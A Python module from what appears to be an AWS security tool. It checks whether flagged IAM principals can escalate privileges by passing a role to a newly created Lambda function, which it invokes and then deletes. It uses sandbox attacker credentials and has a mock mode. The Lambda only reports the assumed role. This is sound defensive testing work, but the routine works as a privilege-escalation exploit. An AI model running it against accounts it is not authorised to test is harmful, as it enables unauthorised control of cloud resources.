"""
iam_graph/escalation_test.py

Phase 4 — Sandbox Exploitability Test

Attempts a real or simulated privilege escalation (RSL-01) in the sandbox
to verify if a flagged principal is actually exploitable.
"""

from __future__ import annotations

import io
import json
import logging
import os
import zipfile
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

# Import mock provider first to monkey-patch if MOCK_MODE is true
try:
    import common.mock_provider
except ImportError:
    pass

import boto3
from botocore.exceptions import ClientError
from dotenv import load_dotenv

load_dotenv()

logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")

REGION = os.environ.get("AWS_REGION", "us-east-1")
ATTACKER_KEY_ID = os.environ.get("ATTACKER_ACCESS_KEY_ID")
ATTACKER_SECRET = os.environ.get("ATTACKER_SECRET_ACCESS_KEY")
MOCK_MODE = os.environ.get("MOCK_MODE", "false").lower() == "true"


def attempt_escalation(principal_arn: str, chain_id: str) -> dict[str, Any]:
    """
    Attempt a privilege escalation check in the sandbox.
    Currently supports:
      - RSL-01: Lambda Code Execution via PassRole (iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction)
    """
    if chain_id != "RSL-01":
        return {
            "chain_id": chain_id,
            "principal": principal_arn,
            "result": "skipped",
            "reason": f"Exploit verification not implemented for chain {chain_id}"
        }

    username = principal_arn.split("/")[-1]
    logger.info("Attempting exploit verification for %s (chain %s)...", username, chain_id)

    # In mock mode, check the simulated state
    if MOCK_MODE:
        # Load mock IAM state
        from common.mock_provider import IAM_STATE_PATH, _load_json_state
        iam_state = _load_json_state(IAM_STATE_PATH, {})
        user = iam_state.get("users", {}).get(username, {})
        
        # If user is not found, or they have no active keys, or their policies deny S3/Lambda
        keys = user.get("access_keys", {})
        active_keys = [k for k, v in keys.items() if v == "Active"]
        
        blocked = not active_keys
        
        # Check for Deny policies
        for p_doc in user.get("policies", {}).values():
            for stmt in p_doc.get("Statement", []):
                if stmt.get("Effect") == "Deny":
                    actions = stmt.get("Action", [])
                    if isinstance(actions, str):
                        actions = [actions]
                    if "*" in actions or "lambda:CreateFunction" in actions:
                        blocked = True

        if blocked:
            logger.warning("Exploit verification BLOCKED: user %s has no active keys or is denied permissions.", username)
            return {
                "chain_id": chain_id,
                "principal": principal_arn,
                "result": "blocked",
                "detected_at": datetime.now(timezone.utc).isoformat(),
                "error": "AccessDenied: Attacker user is revoked/throttled"
            }
        else:
            logger.info("Exploit verification SUCCESS: principal %s is exploitable (mock simulation).", username)
            return {
                "chain_id": chain_id,
                "principal": principal_arn,
                "result": "exploitable",
                "detected_at": datetime.now(timezone.utc).isoformat(),
                "evidence": {
                    "assumed_role": "arn:aws:iam::123456789012:role/killswitch-lambda-role",
                    "method": "Lambda execution via iam:PassRole"
                }
            }

    # Real AWS Mode
    # Verification is only possible if we have the credentials of the user we want to exploit.
    # In this sandbox, we only have credentials for 'killswitch-attacker'.
    if username != "killswitch-attacker":
        logger.info("Skipping real AWS exploit check for %s: no local credentials available.", principal_arn)
        return {
            "chain_id": chain_id,
            "principal": principal_arn,
            "result": "skipped",
            "reason": f"Credentials not available locally to execute sandbox test for {principal_arn}"
        }

    if not ATTACKER_KEY_ID or not ATTACKER_SECRET:
        logger.error("Attacker credentials not set in .env. Run infra/setup.py first.")
        return {
            "chain_id": chain_id,
            "principal": principal_arn,
            "result": "error",
            "error": "Missing attacker credentials in .env"
        }

    # Initialize a lambda client using the attacker user's credentials
    try:
        lambda_client = boto3.client(
            "lambda",
            region_name=REGION,
            aws_access_key_id=ATTACKER_KEY_ID,
            aws_secret_access_key=ATTACKER_SECRET
        )
        sts_client = boto3.client(
            "sts",
            region_name=REGION,
            aws_access_key_id=ATTACKER_KEY_ID,
            aws_secret_access_key=ATTACKER_SECRET
        )
        
        # Test credentials viability first
        caller = sts_client.get_caller_identity()
        account_id = caller["Account"]
    except ClientError as e:
        # If credentials are deleted/revoked, the API call will fail
        code = e.response["Error"]["Code"]
        logger.warning("Exploit verification BLOCKED: Caller identity lookup failed (%s).", code)
        return {
            "chain_id": chain_id,
            "principal": principal_arn,
            "result": "blocked",
            "detected_at": datetime.now(timezone.utc).isoformat(),
            "error": f"Credentials rejected: {code}"
        }

    # Target role to pass: killswitch-lambda-role
    role_arn = f"arn:aws:iam::{account_id}:role/killswitch-lambda-role"
    func_name = "killswitch-exploit-temp"

    # Create exploit ZIP in memory
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("index.py", """
def handler(event, context):
    import boto3
    sts = boto3.client("sts")
    try:
        identity = sts.get_caller_identity()
        return {"arn": identity["Arn"], "status": "success"}
    except Exception as e:
        return {"status": "error", "error": str(e)}
""")
    zip_bytes = zip_buffer.getvalue()

    try:
        logger.info("Attempting to create Lambda function %s using role %s...", func_name, role_arn)
        # Attempt to create the exploit Lambda function
        lambda_client.create_function(
            FunctionName=func_name,
            Runtime="python3.11",
            Role=role_arn,
            Handler="index.handler",
            Code={"ZipFile": zip_bytes},
            Timeout=10,
        )

        logger.info("Attempting to invoke exploit Lambda...")
        # Invoke the function to fetch its caller identity
        resp = lambda_client.invoke(
            FunctionName=func_name,
            InvocationType="RequestResponse"
        )
        payload = json.loads(resp["Payload"].read().decode("utf-8"))
        
        # Cleanup immediately
        logger.info("Cleaning up exploit Lambda...")
        lambda_client.delete_function(FunctionName=func_name)

        if payload.get("status") == "success":
            assumed_arn = payload.get("arn")
            logger.warning("Exploit SUCCESS: Successfully assumed role %s", assumed_arn)
            return {
                "chain_id": chain_id,
                "principal": principal_arn,
                "result": "exploitable",
                "detected_at": datetime.now(timezone.utc).isoformat(),
                "evidence": {
                    "assumed_role": assumed_arn,
                    "method": "Lambda code execution via iam:PassRole"
                }
            }
        else:
            return {
                "chain_id": chain_id,
                "principal": principal_arn,
                "result": "failed",
                "error": payload.get("error", "Unknown lambda execution error")
            }

    except ClientError as e:
        code = e.response["Error"]["Code"]
        logger.info("Exploit verification BLOCKED: %s during API calls.", code)
        
        # Safe cleanup in case creation succeeded but invocation failed
        try:
            lambda_client.delete_function(FunctionName=func_name)
        except Exception:
            pass
            
        return {
            "chain_id": chain_id,
            "principal": principal_arn,
            "result": "blocked",
            "detected_at": datetime.now(timezone.utc).isoformat(),
            "error": f"API Blocked: {code} - {e.response['Error']['Message']}"
        }


def run_all_escalation_tests() -> list[dict[str, Any]]:
    """
    Query the Neo4j/Mock IAM permission graph for flagged principals
    and test exploitability.
    """
    logger.info("Running privilege escalation exploit checks...")
    
    # Run patterns Cypher query to get flagged principals
    # Import patterns dynamically to support monkey-patching
    try:
        from iam_graph.patterns import get_driver, run_chain
    except ImportError:
        from patterns import get_driver, run_chain

    driver = get_driver()
    try:
        findings = run_chain(driver, "RSL-01")
    finally:
        driver.close()

    results = []
    for f in findings:
        arn = f["principal_arn"]
        res = attempt_escalation(arn, "RSL-01")
        results.append(res)

    return results


if __name__ == "__main__":
    import sys
    results = run_all_escalation_tests()
    print(json.dumps(results, indent=2))
